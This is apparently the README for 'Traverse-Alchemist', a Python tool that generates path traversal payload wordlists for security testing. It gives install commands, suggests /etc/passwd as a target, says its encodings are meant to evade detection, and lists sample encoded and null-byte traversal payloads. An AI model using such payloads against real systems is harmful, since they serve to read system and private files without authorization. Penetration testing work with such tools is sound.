# Traverse-Alchemist
# 🌌 Path Traversal Worlists Generator 🚀

Welcome to the **Path Traversal Generator**! This program is designed to help you generate various path traversal payloads. A lot of encodings and workarounds.

## 🌈 Features

- **Dynamic Payload Generation**: Create a variety of payloads to test for path traversal vulnerabilities.
- **Customizable File Paths**: Input any file path to generate tailored payloads.
- **Colorful Output**: Enjoy a vibrant terminal experience with colored outputs!
- **Multiple Encoding**: Generate payloads with various encoding techniques to evade detection.

## 🛠️ Installation and use:

```bash
git clone https://github.com/raikoho/Traverse-Alchemist.git
cd Traverse-Alchemist
python traversal.py
```
You will be prompted to enter the target file path. For example:
```
Enter the target file path (e.g., /etc/passwd):
```
After entering your desired path, the program will generate a colorful wordlist of potential payloads and save it to a text file.

## 📄 Little Example Generated Payloads

```
../../\..\/home/carlos/secret
../../\..\\/\h\o\m\e\/\c\a\r\l\o\s\/\s\e\c\r\e\t
..%5C\/%2Fhome%2Fcarlos%2Fsecret
..%5C\//home/carlos/secret
data/home/carlos/secret
hidden%2Fhome%2Fcarlos%2Fsecret
..%5C\/home/carlos/secret
....//....//....//secret
....//....//....//secret%00.txt
```

## 📜 Contributing

Contributions are welcome! If you have ideas for new features, improvements, or fixes, please open an issue or submit a pull request. Let's make it even better!
